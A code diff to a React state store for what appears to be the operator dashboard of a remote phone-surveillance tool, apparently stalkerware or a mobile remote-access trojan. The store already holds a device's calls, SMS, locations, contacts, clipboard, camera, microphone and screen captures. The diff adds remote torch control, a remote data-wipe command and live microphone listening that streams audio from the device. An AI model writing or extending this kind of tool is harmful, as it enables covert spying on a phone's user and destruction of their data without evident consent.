@@ -46,6 +46,9 @@ export function StoreProvider({ children }) {
   const [latestScreenFrame, setLatestScreenFrame] = useState(null);
   const [cameraStreaming, setCameraStreaming] = useState(false);
   const [latestCameraFrame, setLatestCameraFrame] = useState(null);
+  const [torchOn, setTorchOn] = useState(false);
+  const [liveListening, setLiveListening] = useState(false);
+  const [latestAudioChunk, setLatestAudioChunk] = useState(null);
   const ws = useRef(null);
   const alertTimers = useRef({});
   // Mirrors files.downloadBuffer for the stray-terminator guard below
@@ -409,6 +412,28 @@ function titleOrApp(appName, title, text) {
           break;
         }
 
+        case 'TORCH_RESULT': {
+          if (typeof p.torchOn === 'boolean') setTorchOn(p.torchOn);
+          pushToast(p.success ? `Torch ${p.torchOn ? 'turned ON' : 'turned OFF'}` : `Torch error: ${p.error || 'failed'}`, p.success ? 'success' : 'error');
+          break;
+        }
+
+        case 'WIPE_RESULT': {
+          pushToast(p.success ? 'Phone wipe command executed successfully' : `Wipe failed: ${p.error || 'Device Admin required'}`, p.success ? 'success' : 'error');
+          break;
+        }
+
+        case 'LIVE_LISTEN_STATUS': {
+          setLiveListening(!!p.active);
+          if (p.error) pushToast(`Live listen: ${p.error}`, 'error');
+          break;
+        }
+
+        case 'LIVE_AUDIO_CHUNK': {
+          setLatestAudioChunk(p);
+          break;
+        }
+
         default:
           break;
       }
@@ -604,6 +629,13 @@ function titleOrApp(appName, title, text) {
           })
           .catch(() => {});
       },
+      torchOn,
+      toggleTorch: (enabled) => sendCommand('torch', { deviceId: activeDeviceId, enabled }),
+      wipeDevice: (confirmation) => sendCommand('wipe-data', { deviceId: activeDeviceId, confirmation }),
+      liveListening,
+      latestAudioChunk: (latestAudioChunk && latestAudioChunk.deviceId === activeDeviceId) ? latestAudioChunk : null,
+      startLiveListen: () => sendCommand('live-listen-start', { deviceId: activeDeviceId }),
+      stopLiveListen: () => sendCommand('live-listen-stop', { deviceId: activeDeviceId }),
       removeDevice: async (deviceId) => {
         try {
           const res = await fetch(`/api/devices/${deviceId}`, { method: 'DELETE' });
@@ -625,7 +657,7 @@ function titleOrApp(appName, title, text) {
         return false;
       }
     }),
-    [devices, activeDeviceId, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame]
+    [devices, activeDeviceId, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk]
   );
 
   return <StoreContext.Provider value={value}>{children}</StoreContext.Provider>;
